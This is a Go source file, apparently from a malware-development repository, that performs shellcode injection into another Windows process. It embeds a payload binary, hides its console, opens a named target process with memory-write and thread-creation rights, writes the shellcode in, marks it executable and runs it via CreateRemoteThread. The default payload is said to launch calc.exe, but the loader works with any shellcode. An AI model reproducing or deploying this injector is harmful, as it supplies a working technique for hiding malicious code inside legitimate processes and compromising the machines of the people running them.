//go:build windows
// +build windows

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"unsafe"

	_ "embed"

	"github.com/himazawa/maldev/internal/utils"
	"golang.org/x/sys/windows"
)

var (
	// embedding the payload
	// the default payload will spawn calc.exe
	//go:embed data/shellcode.bin
	payload []byte
)

func main() {
	targetPtr := flag.String("target", "", "name of the target process (e.g notepad.exe)")
	flag.Parse()
	if *targetPtr == "" {
		fmt.Println("You need to specify the target using the -target flag")
		os.Exit(1)
	}

	utils.FreeConsole.Call()
	pid, err := utils.FindPIDFromProcessName(*targetPtr)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println(pid)

	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|
		windows.PROCESS_VM_WRITE, false, pid)
	if err != nil {
		log.Fatalln(err)
	}
	payloadLen := uintptr(len(payload))

	pRemoteCode, memPerm, err := utils.GetProcPointer(uintptr(processHandle), payloadLen)
	if err != nil {
		panic(err)
	}
	utils.WriteProcessMemory.Call(uintptr(processHandle), pRemoteCode, (uintptr)(unsafe.Pointer(&payload[0])), payloadLen)

	// set the exec region from READWRITE to exec
	utils.SetPermissionToExec(uintptr(processHandle), pRemoteCode, payloadLen, memPerm)

	// spawn process
	utils.CreateRemoteThread.Call(uintptr(processHandle), 0, 0, pRemoteCode, 0, 0, 0)
	windows.CloseHandle(processHandle)

}
